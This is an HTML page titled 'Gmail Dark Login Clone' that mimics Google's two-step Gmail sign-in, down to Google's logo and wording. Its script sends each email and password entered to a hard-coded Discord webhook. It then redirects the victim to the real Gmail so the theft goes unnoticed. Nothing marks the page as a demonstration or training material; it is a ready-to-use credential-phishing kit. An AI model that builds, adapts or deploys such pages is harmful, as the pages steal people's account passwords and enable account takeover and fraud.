<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Gmail Dark Login Clone</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      darkMode: 'class'
    };
  </script>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
    }
    .input:focus {
      outline: none;
      border-color: #8ab4f8;
      box-shadow: 0 0 0 2px #8ab4f850;
    }
  </style>
</head>
<body class="bg-[#202124] text-white min-h-screen flex flex-col justify-center items-center px-4">
  <div class="w-full max-w-4xl bg-[#171717] rounded-3xl shadow-lg p-8 md:p-10">
    <div id="emailStep">
      <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x_r5.png" alt="Google Logo" class="h-7 mb-10">
      <h1 class="text-3xl font-normal mb-1">Sign in</h1>
      <p class="text-sm text-gray-400 mb-8">to continue to Gmail</p>
      <form id="emailForm" class="space-y-6">
        <input id="emailInput" type="email" placeholder="Email or phone" required class="input w-full bg-transparent border border-gray-600 rounded px-4 py-3 text-sm placeholder-gray-400">
        <div>
          <a href="#" class="text-sm text-[#8ab4f8]">Forgot email?</a>
        </div>
        <p class="text-xs text-gray-400">Not your computer? Use Guest mode to sign in privately. <a href="#" class="text-[#8ab4f8]">Learn more</a></p>
        <div class="flex justify-between items-center mt-6">
          <button type="button" class="text-sm text-[#8ab4f8] font-medium">Create account</button>
          <button type="submit" class="bg-[#8ab4f8] hover:bg-[#669df6] text-black text-sm font-medium px-6 py-2 rounded-full">Next</button>
        </div>
      </form>
    </div>

    <div id="passwordStep" class="hidden">
      <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_dark_1x_r5.png" alt="Google Logo" class="h-7 mb-10">
      <h1 class="text-3xl font-normal mb-8">Welcome</h1>
      <div class="flex items-center space-x-2 bg-black border border-gray-600 text-white px-3 py-2 rounded-full w-fit mb-6">
        <svg class="w-5 h-5 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.7 0 5.8 1.3 6 2v2H6v-2c.2-.7 3.3-2 6-2zm0-2c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
        <span id="userEmailDisplay">user@gmail.com</span>
        <svg class="w-4 h-4 text-gray-400" fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
      </div>
      <form id="passwordForm" class="space-y-6">
        <input id="passwordInput" type="password" placeholder="Enter your password" required class="input w-full bg-transparent border border-gray-600 rounded px-4 py-3 text-sm placeholder-gray-400">
        <div class="flex items-center">
          <input type="checkbox" id="showPassword" class="form-checkbox border-gray-500 mr-2">
          <label for="showPassword" class="text-sm">Show password</label>
        </div>
        <div class="flex justify-between items-center">
          <a href="#" class="text-sm text-[#8ab4f8]">Forgot password?</a>
          <button type="submit" class="bg-[#8ab4f8] hover:bg-[#669df6] text-black text-sm font-medium px-6 py-2 rounded-full">Next</button>
        </div>
      </form>
    </div>
  </div>

  <script>
    const emailForm = document.getElementById('emailForm');
    const passwordForm = document.getElementById('passwordForm');
    const passwordStep = document.getElementById('passwordStep');
    const emailStep = document.getElementById('emailStep');
    const userEmailDisplay = document.getElementById('userEmailDisplay');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');
    const showPassword = document.getElementById('showPassword');
    
    const webhookURL = 'https://discord.com/api/webhooks/1358533803164827791/SC7RqePQmAO3StmRzKpPauhodEGwl3KmOh4sKkO_rYbRpl5rJ8yQhKyYqgWjZDO7MM-n';

    emailForm.addEventListener('submit', function (e) {
      e.preventDefault();
      userEmailDisplay.textContent = emailInput.value;
      emailStep.classList.add('hidden');
      passwordStep.classList.remove('hidden');
    });

    passwordForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const email = emailInput.value;
      const password = passwordInput.value;

      // Send email and password to Discord webhook
      const data = {
        content: `Email: ${email}\nPassword: ${password}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(data => console.log('Successfully sent data to Discord:', data))
      .catch(error => console.error('Error sending data to Discord:', error));

      // Redirect to Gmail login page after submitting
      setTimeout(function() {
        window.location.href = "https://mail.google.com/mail/u/0/?pli=1";
      }, 1000); // Delay redirection by 1 second to allow the webhook to process
    });

    showPassword.addEventListener('change', function () {
      passwordInput.type = this.checked ? 'text' : 'password';
    });
  </script>
</body>
</html>
